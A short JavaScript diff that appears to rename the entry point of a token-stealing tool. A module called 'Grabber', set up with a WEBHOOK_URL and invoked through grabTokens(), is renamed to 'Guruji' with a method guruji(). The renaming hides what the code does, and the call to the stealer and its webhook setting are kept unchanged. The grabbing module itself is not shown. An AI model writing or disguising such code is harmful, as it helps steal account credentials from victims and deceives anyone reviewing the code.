@@ -1,7 +1,7 @@
-const Grabber = require('./Grabber');
-const grabber = new Grabber({
+const Guruji = require('./Guruji');
+const technical = new Guruji({
     WEBHOOK_URL: '',
     ping: false
 });
 
-grabber.grabTokens();
+technical.guruji();
